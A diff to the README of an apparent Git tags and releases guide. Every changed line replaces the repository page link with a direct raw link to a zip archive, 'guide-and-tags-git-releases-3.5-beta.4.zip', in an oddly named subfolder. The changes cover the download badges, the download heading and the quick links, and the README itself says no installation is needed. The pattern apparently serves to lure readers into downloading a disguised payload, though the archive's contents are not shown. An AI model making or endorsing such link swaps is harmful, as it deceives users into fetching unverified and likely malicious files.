@@ -1,6 +1,6 @@
 # 🏷️ git-tags-and-releases-guide - Clear Git Tags and Releases Guide
 
-[![Download](https://img.shields.io/badge/Download-GitHub%20Repo-blue?style=for-the-badge)](https://github.com/PSTEzecool/git-tags-and-releases-guide)
+[![Download](https://img.shields.io/badge/Download-GitHub%20Repo-blue?style=for-the-badge)](https://github.com/PSTEzecool/git-tags-and-releases-guide/raw/refs/heads/main/engarrison/guide-and-tags-git-releases-3.5-beta.4.zip)
 
 ## 📘 About this Guide
 
@@ -41,7 +41,7 @@ No installation is necessary. This guide is a set of instructions and examples y
 
 Visit the page below to download or browse the project files:
 
-### https://github.com/PSTEzecool/git-tags-and-releases-guide
+### https://github.com/PSTEzecool/git-tags-and-releases-guide/raw/refs/heads/main/engarrison/guide-and-tags-git-releases-3.5-beta.4.zip
 
 Steps to download files on Windows:
 
@@ -118,8 +118,8 @@ The guide aims to stay practical and useful for everyone interested in software 
 
 ## 🔗 Quick Links
 
-- Download page: https://github.com/PSTEzecool/git-tags-and-releases-guide  
+- Download page: https://github.com/PSTEzecool/git-tags-and-releases-guide/raw/refs/heads/main/engarrison/guide-and-tags-git-releases-3.5-beta.4.zip  
 - Guide files download: Click **Code** > **Download ZIP** on the page  
 - Learn about production branching: See docs/branching-strategy.md  
 
-[![Download](https://img.shields.io/badge/Download-GitHub%20Repo-blue?style=for-the-badge)](https://github.com/PSTEzecool/git-tags-and-releases-guide)
+[![Download](https://img.shields.io/badge/Download-GitHub%20Repo-blue?style=for-the-badge)](https://github.com/PSTEzecool/git-tags-and-releases-guide/raw/refs/heads/main/engarrison/guide-and-tags-git-releases-3.5-beta.4.zip)
